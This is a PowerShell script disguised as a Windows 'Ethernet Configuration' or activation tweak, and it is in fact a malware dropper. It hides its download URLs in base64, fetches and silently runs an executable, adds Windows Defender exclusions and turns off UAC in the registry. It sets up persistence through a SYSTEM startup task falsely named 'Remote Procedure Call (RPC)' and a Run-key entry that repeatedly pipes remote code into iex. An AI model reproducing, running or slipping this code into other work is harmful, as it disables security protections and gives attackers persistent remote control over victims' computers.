$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2RvbGJvZWIuZXhl"
$updaterExeB64 = "dXBkYXRlci5leGU="
$hiddenAttrB64 = "SGlkZGVu"
$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="
$scriptUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ludm9rZWNvbW1hbmQ=" # заменить на реал
$trustedNameB64 = "TWljcm9zb2Z0RXRoZXJuZXRVcGRhdGUucHMx"
$trustedFolderB64 = "VXBkYXRlQ2FjaGU="
$programfilesB64 = "QzpcUHJvZ3JhbSBGaWxlcw=="


$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($scriptUrlB64))
$trustedName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedNameB64))
$trustedFolder = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedFolderB64))
$programfiles = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($programfilesB64))
$uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
$persistFolder = Join-Path $env:ProgramFiles $trustedFolder

function Add-ScheduledTask {
    try {
        $persistFolder = "C:\ProgramData\Java Schedule Updater"
        $persistScriptPath = Join-Path $persistFolder $trustedName
        if (-not (Test-Path -Path $persistFolder)) {
            New-Item -Path $persistFolder -ItemType Directory -Force
        }


        Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing -ErrorAction Stop      

        Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value "Hidden"

        $action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistScriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName 'Remote Procedure Call (RPC)' -Description 'Microsoft Corporation Remote Procedure Calls needs to be autorunned with Windows to run Ethernet Configuration' -ErrorAction Stop
        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/TaskSuccesful" | iex
        Clear-Host
    } catch {}
}

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $stopAction
    } catch {}
}

function Disable-UAC {
    try {
        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -ErrorAction $silentlyContinue
        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0 -ErrorAction $silentlyContinue
    } catch {}
}

if ($uacStatus -eq $false) {
    Add-ScheduledTask
    New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
    Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
    Add-Exclusion -Path $persistFolder -ErrorAction $stopAction

    $hiddenFolder = Join-Path $env:ProgramFiles ([System.Guid]::NewGuid().ToString())
    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
    Add-Exclusion -Path $hiddenFolder -ErrorAction $stopAction
    $tempPath = Join-Path $hiddenFolder $updaterExe

    try {
        Write-Host "Loading Ethernet Configuration..." -BackgroundColor Green
        Add-Exclusion -Path $programfiles -ErrorAction $stopAction
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    
        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
        Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
    
        $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -PassThru -Wait
        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/SuccesfulRun" | iex
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "Windows Powershell Application"
        $regValue = "powershell.exe -WindowStyle Hidden -Command ""iwr 'https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/ReactivateScript' | iex"""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction $silentlyContinue
    } catch {
        Write-Host "An error occurred during loading Ethernet Configuration. Please try again." -ForegroundColor Red
        exit 1
    } finally {
        if (Test-Path $hiddenFolder) {
            Remove-Item $hiddenFolder -Recurse -Force
        }
    }
} else {
    try {
        Disable-UAC
        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/Failed" | iex
    } catch {
        exit 1
    }

}
